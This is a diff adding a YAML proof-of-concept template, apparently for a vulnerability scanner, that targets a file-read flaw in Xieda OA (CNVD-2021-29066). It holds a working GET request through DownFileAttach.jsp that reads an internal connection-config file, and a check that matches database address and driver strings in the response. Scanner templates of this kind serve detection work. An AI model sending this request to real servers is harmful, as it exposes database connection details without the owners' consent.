@@ -1,0 +1,18 @@
+name: poc-yaml-xieda-oa-artibute-cnvd-2021-29066-file-read
+manual: true
+transport: http
+rules:
+  r1:
+    request:
+      method: GET
+      path: /interface/DownFileAttach.jsp?filepath=/WEB-INF/classes/YxrConnectText.txt
+      follow_redirects: true
+    expression: response.status == 200 && "ipPort\\s*=\\s*(.*):(.*)\n".bmatches(response.body) && response.body.bcontains(b"driver")
+expression: r1()
+detail:
+  author: Aurora
+  links:
+    - https://chowdera.com/2022/142/202205210614582565.html
+  vulnerability:
+    id: CT-456753
+    level: high
